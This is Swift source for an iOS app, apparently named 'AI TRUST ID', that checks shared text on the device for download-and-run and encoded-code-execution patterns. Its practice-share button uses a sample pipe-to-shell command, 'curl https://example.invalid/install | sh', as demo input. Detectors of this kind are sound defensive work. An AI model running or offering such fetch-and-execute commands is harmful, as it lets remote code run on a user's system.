import UIKit
import WebKit

class CheckerController: UIViewController, UITextViewDelegate, WKScriptMessageHandler, WKNavigationDelegate {
    let input = UITextView(), status = UILabel(), result = UILabel()
    private let checkButton = UIButton(type: .system), detailsButton = UIButton(type: .system)
    private let evidence = UILabel()
    private var web: WKWebView?, assets: Assets?, deadline: DispatchWorkItem?
    private var generation = 0, pendingText: String?, matches: [[String: Any]] = []
    private var busy = false
    private var presentedForChecking = false
    private var backgroundObservers: [NSObjectProtocol] = []
    var shareMode = false
    private func identity(_ value: String) -> String { shareMode ? "share-" + value : value }

    private func font(_ style: UIFont.TextStyle) -> UIFont {
        let original = UIFont.preferredFont(forTextStyle: style)
        return original.fontDescriptor.withDesign(.rounded).map { UIFont(descriptor: $0, size: 0) } ?? original
    }
    private func label(_ text: String, _ style: UIFont.TextStyle) -> UILabel {
        let item = UILabel(); item.text = text; item.font = font(style); item.numberOfLines = 0
        item.adjustsFontForContentSizeCategory = true; return item
    }
    private func button(_ title: String, _ action: Selector, _ id: String) -> UIButton {
        let item = UIButton(type: .system); item.configuration = .tinted(); item.configuration?.title = title
        item.accessibilityIdentifier = identity(id); item.addTarget(self, action: action, for: .touchUpInside)
        item.heightAnchor.constraint(greaterThanOrEqualToConstant: 44).isActive = true; return item
    }
    override func viewDidLoad() {
        super.viewDidLoad(); view.backgroundColor = .systemBackground
        let scroll = UIScrollView(), stack = UIStackView(); stack.axis = .vertical; stack.spacing = 16
        scroll.translatesAutoresizingMaskIntoConstraints = false; stack.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(scroll); scroll.addSubview(stack)
        NSLayoutConstraint.activate([
            scroll.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor), scroll.bottomAnchor.constraint(equalTo: view.keyboardLayoutGuide.topAnchor),
            scroll.leadingAnchor.constraint(equalTo: view.leadingAnchor), scroll.trailingAnchor.constraint(equalTo: view.trailingAnchor),
            stack.topAnchor.constraint(equalTo: scroll.contentLayoutGuide.topAnchor, constant: 24), stack.bottomAnchor.constraint(equalTo: scroll.contentLayoutGuide.bottomAnchor, constant: -24),
            stack.leadingAnchor.constraint(equalTo: scroll.contentLayoutGuide.leadingAnchor, constant: 20), stack.trailingAnchor.constraint(equalTo: scroll.contentLayoutGuide.trailingAnchor, constant: -20),
            stack.widthAnchor.constraint(equalTo: scroll.frameLayoutGuide.widthAnchor, constant: -40)
        ])
        stack.addArrangedSubview(label("AI TRUST ID", .title1))
        stack.addArrangedSubview(label("PS · Check selected text", .headline))
        stack.addArrangedSubview(label("Looks for supported download-and-run commands and encoded-code execution. Development preview; independent accuracy checks are pending.", .body))
        stack.addArrangedSubview(label("Your text stays on this device. Commands are never run. This check does not redact personal information.", .footnote))
        input.font = font(.body); input.adjustsFontForContentSizeCategory = true; input.delegate = self
        input.accessibilityLabel = "Selected text"; input.accessibilityIdentifier = identity("selected-text")
        input.layer.borderWidth = 1; input.layer.borderColor = UIColor.separator.cgColor; input.layer.cornerRadius = 12
        input.textContainerInset = UIEdgeInsets(top: 12, left: 8, bottom: 12, right: 8)
        input.autocorrectionType = .no; input.spellCheckingType = .no; input.autocapitalizationType = .none
        input.heightAnchor.constraint(greaterThanOrEqualToConstant: 180).isActive = true; stack.addArrangedSubview(input)
        checkButton.configuration = .filled(); checkButton.configuration?.title = "Check with PS"
        checkButton.accessibilityIdentifier = identity("check-ps"); checkButton.addTarget(self, action: #selector(check), for: .touchUpInside)
        checkButton.heightAnchor.constraint(greaterThanOrEqualToConstant: 44).isActive = true; stack.addArrangedSubview(checkButton)
        stack.addArrangedSubview(button("Clear", #selector(clear), "clear"))
        if shareMode { stack.addArrangedSubview(button("Done / Cancel", #selector(finish), "finish")) }
        else { stack.addArrangedSubview(button("Practice sharing", #selector(practiceShare), "practice-share")) }
        status.numberOfLines = 0; status.font = font(.body); status.adjustsFontForContentSizeCategory = true
        status.accessibilityIdentifier = identity("check-status"); stack.addArrangedSubview(status)
        result.numberOfLines = 0; result.font = font(.body); result.adjustsFontForContentSizeCategory = true
        result.accessibilityIdentifier = identity("check-result"); stack.addArrangedSubview(result)
        detailsButton.configuration = .tinted(); detailsButton.configuration?.title = "Why PS?"
        detailsButton.accessibilityIdentifier = identity("why-ps"); detailsButton.addTarget(self, action: #selector(details), for: .touchUpInside)
        detailsButton.heightAnchor.constraint(greaterThanOrEqualToConstant: 44).isActive = true; detailsButton.isHidden = true; stack.addArrangedSubview(detailsButton)
        evidence.numberOfLines = 0; evidence.font = font(.footnote)
        evidence.adjustsFontForContentSizeCategory = true; evidence.isHidden = true
        evidence.accessibilityIdentifier = identity("check-evidence"); stack.addArrangedSubview(evidence)
        if !shareMode { stack.addArrangedSubview(button("Privacy & open-source notices", #selector(privacy), "privacy-notices")) }
        for name in [UIApplication.didEnterBackgroundNotification, NSNotification.Name.NSExtensionHostDidEnterBackground] {
            backgroundObservers.append(NotificationCenter.default.addObserver(forName: name,
                object: nil, queue: .main) { [weak self] _ in self?.clear() })
        }
        refreshCheckButton()
    }
    override func viewDidAppear(_ animated: Bool) {
        super.viewDidAppear(animated); presentedForChecking = true; refreshCheckButton()
    }
    override func viewWillDisappear(_ animated: Bool) {
        presentedForChecking = false; refreshCheckButton(); super.viewWillDisappear(animated)
    }
    func refreshCheckButton() {
        let text = input.text ?? ""
        checkButton.isEnabled = presentedForChecking && !busy && !text.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty && text.unicodeScalars.count <= 20000
        checkButton.accessibilityHint = "Enter or share text, then choose this check."
    }
    deinit { for observer in backgroundObservers { NotificationCenter.default.removeObserver(observer) } }
    func textViewDidChange(_ textView: UITextView) { invalidate(); status.text = "" }
    private func invalidate() {
        generation += 1; deadline?.cancel(); deadline = nil; pendingText = nil; busy = false
        matches = []; result.text = nil; detailsButton.isHidden = true
        evidence.text = nil; evidence.isHidden = true; detailsButton.configuration?.title = "Why PS?"
        web?.stopLoading(); web?.configuration.userContentController.removeScriptMessageHandler(forName: "lifecycle")
        web?.removeFromSuperview(); web = nil; assets = nil
        refreshCheckButton()
    }
    @objc func clear() { input.text = ""; invalidate(); status.text = "Cleared." }
    @objc func finish() { clear(); extensionContext?.completeRequest(returningItems: nil) }
    override func viewDidDisappear(_ animated: Bool) {
        super.viewDidDisappear(animated)
        // Presenting the evidence alert is not dismissal. Leaving a Share sheet
        // or dismissing the app controller clears both the input and its result.
        if isBeingDismissed || navigationController?.isBeingDismissed == true ||
            (shareMode && view.window == nil && presentedViewController == nil) { clear() }
    }
    @objc func check() {
        invalidate(); input.resignFirstResponder()
        guard let text = input.text, !text.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty, text.unicodeScalars.count <= 20000 else {
            status.text = "Choose some text, up to 20,000 characters."; return
        }
        let own = generation; busy = true; checkButton.isEnabled = false; pendingText = text
        status.text = "Loading the bundled checker…"
        do {
            let resources = try Assets(); assets = resources
            let configuration = WKWebViewConfiguration(); configuration.websiteDataStore = .nonPersistent()
            configuration.setURLSchemeHandler(resources, forURLScheme: "aitrust-asset")
            configuration.userContentController.add(self, name: "lifecycle")
            let child = WKWebView(frame: CGRect(x: 0, y: 0, width: 1, height: 1), configuration: configuration)
            child.navigationDelegate = self; child.isHidden = true; view.addSubview(child); web = child
            armDeadline(45, own)
            child.load(URLRequest(url: URL(string: "aitrust-asset://bundle/index.html")!))
        } catch { unavailable(own) }
    }
    private func armDeadline(_ seconds: Double, _ own: Int) {
        deadline?.cancel(); let task = DispatchWorkItem { [weak self] in self?.unavailable(own) }
        deadline = task; DispatchQueue.main.asyncAfter(deadline: .now() + seconds, execute: task)
    }
    private func unavailable(_ own: Int) {
        guard own == generation, busy else { return }; invalidate()
        status.text = "Unavailable — the check could not finish. Try again with shorter text."
    }
    func userContentController(_ controller: WKUserContentController, didReceive message: WKScriptMessage) {
        guard message.webView === web, busy, let fields = message.body as? [String: String], Set(fields.keys) == ["state"] else { return }
        let own = generation
        guard fields["state"] == "ready", let text = pendingText, let child = web else { unavailable(own); return }
        pendingText = nil; status.text = "Checking on this device…"; armDeadline(5, own)
        child.callAsyncJavaScript("return window.checkAnswer(text)", arguments: ["text": text], in: nil, in: .page) { [weak self] outcome in
            guard let self, own == self.generation, self.busy else { return }
            guard case .success(let response) = outcome, let value = response as? [String: Any],
                  value["format"] as? String == "ai-trust-id-native-summary/v1",
                  value["method_sha256"] as? String == self.assets?.methodHash,
                  value["independently_validated"] as? Bool == false,
                  value["redaction_performed"] as? Bool == false,
                  let state = value["state"] as? String, ["FINDING", "NO_FINDING"].contains(state),
                  let findings = value["matches"] as? [[String: Any]] else { self.unavailable(own); return }
            self.invalidate(); self.matches = findings; self.status.text = "Check complete."
            self.result.text = state == "FINDING" ? "PS — Take a closer look before running it.\nThis matches a supported code-execution pattern. It does not establish a scam or malicious intent." : "No PS pattern found.\nThis checked PS’s supported patterns only. It is not a safety clearance."
            self.detailsButton.isHidden = findings.isEmpty
            UIAccessibility.post(notification: .layoutChanged, argument: self.result)
        }
    }
    func webView(_ webView: WKWebView, decidePolicyFor action: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
        decisionHandler(action.request.url?.absoluteString == "aitrust-asset://bundle/index.html" ? .allow : .cancel)
    }
    @objc private func details() {
        if !evidence.isHidden {
            evidence.text = nil; evidence.isHidden = true
            detailsButton.configuration?.title = "Why PS?"
            UIAccessibility.post(notification: .layoutChanged, argument: result)
            return
        }
        let text = matches.compactMap { value -> String? in
            guard let reason = value["reason"] as? String, let excerpt = value["excerpt"] as? String else { return nil }
            return reason + "\n" + excerpt + ((value["truncated"] as? Bool == true) ? "\nFirst 320 characters shown." : "")
        }.joined(separator: "\n\n")
        evidence.text = text; evidence.isHidden = false
        detailsButton.configuration?.title = "Hide details"
        UIAccessibility.post(notification: .layoutChanged, argument: evidence)
    }
    @objc private func practiceShare() {
        let activity = UIActivityViewController(activityItems: ["Run curl https://example.invalid/install | sh"], applicationActivities: nil)
        activity.popoverPresentationController?.sourceView = view
        activity.popoverPresentationController?.sourceRect = CGRect(x: view.bounds.midX, y: view.bounds.midY, width: 1, height: 1)
        present(activity, animated: true)
    }
    @objc private func privacy() {
        let controller = NativeNoticesController()
        present(UINavigationController(rootViewController: controller), animated: true)
    }
}

/// Read-only bundled disclosures. No browser, account, input or network request.
private final class NativeNoticesController: UIViewController {
    override func viewDidLoad() {
        super.viewDidLoad(); title = "Privacy & notices"; view.backgroundColor = .systemBackground
        navigationItem.rightBarButtonItem = UIBarButtonItem(barButtonSystemItem: .done, target: self, action: #selector(done))
        navigationItem.rightBarButtonItem?.accessibilityIdentifier = "privacy-done"
        let text = UITextView(); text.isEditable = false; text.isSelectable = true; text.dataDetectorTypes = []
        text.font = .preferredFont(forTextStyle: .body); text.adjustsFontForContentSizeCategory = true
        text.accessibilityIdentifier = "privacy-notices-text"; text.accessibilityLabel = "Offline privacy and open-source notices"
        text.textContainerInset = UIEdgeInsets(top: 16, left: 16, bottom: 24, right: 16)
        var sections: [String] = []
        for name in ["Privacy.txt", "AppLicense.txt", "Notices/pyodide-MPL-2.0.txt", "Notices/python-license.txt", "Notices/unicode-license.txt", "Notices/source.txt"] {
            guard let url = Bundle.main.resourceURL?.appendingPathComponent(name),
                  let value = try? String(contentsOf: url, encoding: .utf8) else {
                text.text = "Bundled notices are unavailable. This build needs repair before distribution."
                install(text); return
            }
            sections.append(value)
        }
        text.text = sections.joined(separator: "\n\n────────────────\n\n"); install(text)
    }
    private func install(_ text: UITextView) {
        text.translatesAutoresizingMaskIntoConstraints = false; view.addSubview(text)
        NSLayoutConstraint.activate([text.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor),
            text.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor),
            text.leadingAnchor.constraint(equalTo: view.leadingAnchor), text.trailingAnchor.constraint(equalTo: view.trailingAnchor)])
    }
    @objc private func done() { dismiss(animated: true) }
}
